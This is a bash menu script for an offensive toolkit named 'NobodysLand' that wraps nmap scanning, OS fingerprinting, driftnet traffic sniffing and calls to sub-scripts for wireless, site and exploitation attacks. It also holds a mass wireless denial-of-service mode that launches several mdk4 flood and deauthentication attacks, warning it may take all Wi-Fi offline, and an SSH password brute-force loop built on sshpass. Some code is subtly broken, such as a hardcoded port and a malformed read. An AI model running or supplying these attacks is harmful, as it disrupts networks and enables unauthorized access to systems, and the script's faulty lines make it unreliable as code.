cyan='\e[0;36m' 
green='\033[92m'  
red='\e[1;31m' 
yel='\e[0;33m' 
orange='\e[38;5;166m'

clear

echo -e $red""


echo "███╗   ██╗ ██████╗ ██████╗  ██████╗ ██████╗ ██╗   ██╗███████╗"
echo "████╗  ██║██╔═══██╗██╔══██╗██╔═══██╗██╔══██╗╚██╗ ██╔╝██╔════╝"
echo "██╔██╗ ██║██║   ██║██████╔╝██║   ██║██║  ██║ ╚████╔╝ ███████╗"
echo "██║╚██╗██║██║   ██║██╔══██╗██║   ██║██║  ██║  ╚██╔╝  ╚════██║"
echo "██║ ╚████║╚██████╔╝██████╔╝╚██████╔╝██████╔╝   ██║   ███████║"
echo "╚═╝  ╚═══╝ ╚═════╝ ╚═════╝  ╚═════╝ ╚═════╝    ╚═╝   ╚══════╝"

echo "██╗      █████╗ ███╗   ██╗██████╗"                         
echo "██║     ██╔══██╗████╗  ██║██╔══██╗"                           
echo "██║     ███████║██╔██╗ ██║██║  ██║"                           
echo "██║     ██╔══██║██║╚██╗██║██║  ██║"                           
echo "███████╗██║  ██║██║ ╚████║██████╔╝"                           
echo "╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ "                           
                                                             


echo -e $yel"               [+] Developer: $red _0day_at0mik_"
echo -e $yel"               [+] Tool: $red NobodysLand"
echo -e $yel"               [+] $red Codename: Titan "
echo " "
echo -e $cyan"                By 0Day-At0mik"

#Attacks

echo -e $green"========================"
echo -e $yel" 1)Scan Target        2)OS Fingerprint"
echo -e $green"========================"
echo -e $yel" 3)WLAN Attacks Menú  4)Site Attacks Menú"
echo -e $green"========================"
echo -e $yel" 5)NobodysLand Attack"
echo -e $green"========================"
echo -e $yel" 6)MITM"
echo -e $green"========================"
echo -e $yel" 7)Exploitation Menú"
echo -e $green"========================"
echo -e $yel" 8)SSH-BruteForce"
echo -e $green"========================"

echo -e $red"               Happy Hacking! "

#Question

read -p " NLF~#: " attacks 

#Scan

if [ $attacks = "1" ] 
then
clear 
figlet "Scan"
read -p " [>TARGET-IP<] " target1 
nmap $target1  
fi

#OS Fingerprint

if [ $attacks = "2" ]
then
clear 
figlet "OS"
figlet "Fingerprint"
read -p " [>TARGET-IP<] " target2 
nmap -A $target2
fi

#Wlan-Attacks

if [ $attacks = "3" ]
then
clear
cd $HOME/NobodysLand/
bash WA.sh
fi

#Site-Attacks

if [ $attacks = "4" ]
then
clear
cd $HOME/NobodysLand/
bash SA.sh 
fi

#NL-Attacks

if [ $attacks = "5" ]
then 
clear
figlet "Nobodys"
figlet "Land"
figlet "Attack" 
fi

if [ $attacks = "5" ]
then
echo -e $cyan"Are You Sure To Start This Powerful Attacks. This Attack May Take Offline All WiFi On Your Network [y/N]"

read -p " [>Choose<] " choose
if [ $choose = "y" ] 
then
read -p " [>target<] " $targetap1
read -p " [>Interface<] " inter
echo -e $red"[+] Starting..."

gnome-terminal \
--title="NobodysLand-Attack" \
--working-directory="$HOME" \
--command="bash -c \"sudo mdk4 $inter a ; \
exec bash\"" \

gnome-terminal \
--title="NobodysLand-Attack" \
--working-directory="$HOME" \
--command="bash -c \"sudo mdk4 $inter b ; \
exec bash\"" \

gnome-terminal \
--title="NobodysLand-Attack" \
--working-directory="$HOME" \
--command="bash -c \"sudo mdk4 $inter d ; \
exec bash\"" \

gnome-terminal \
--title="NobodysLand-Attack" \
--working-directory="$HOME" \
--command="bash -c \"sudo mdk4 $inter m -t $targetap1 ; \
exec bash\"" \

gnome-terminal \
--title="NobodysLand-Attack" \
--working-directory="$HOME" \
--command="bash -c \"sudo mdk4 $inter w -e $targetap1 -z ; \
exec bash\"" \

fi
fi

#MITM

if [ $attacks = "6" ]
then
clear
figlet "MITM"
read -p " [>interface<] " target6
xterm -hold -e driftnet -i $target6 
fi

if [ $attacks = "7" ]
then

cd /$HOME/NobodysLand

bash EA.sh
fi

if [ $attacks = "8" ] 
then
clear

figlet "SSH-Brute" |lolcat

read -p " [>SSH-Target<] " target1
read -p " [>Wordlist<] " wordlist
read -p " [>SSH-Port<] " port1


count=0; while [ true ]; do start=$((1+$count)) end=$((5+$count)); for pass in $(sed -n ''$start','$end'p'$wordlist); do {(sshpass -p $pass ssh -o StrictHostKey=no $target1 -p 2022 "whoami" && echo Found! pass: $pass && kill -2 $$;)} & done ;wait $!; let count+=5;done 
fi

